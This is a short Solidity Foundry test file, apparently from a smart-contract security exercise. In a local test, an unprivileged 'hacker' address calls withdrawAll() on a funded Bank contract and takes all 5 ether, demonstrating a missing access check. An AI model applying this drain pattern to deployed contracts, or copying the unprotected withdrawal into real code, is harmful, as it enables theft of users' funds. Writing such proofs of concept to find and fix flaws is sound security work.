// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Bank} from "../src/Bank.sol";

contract BankHack is Test {
    Bank public bank;
    address hacker = address(0xBAD);

    function setUp() public {
        bank = new Bank();
        vm.deal(address(bank), 5 ether);
    }

    function test_Hack() public {
        vm.prank(hacker);
        bank.withdrawAll();
        assertEq(hacker.balance, 5 ether);
    }
}
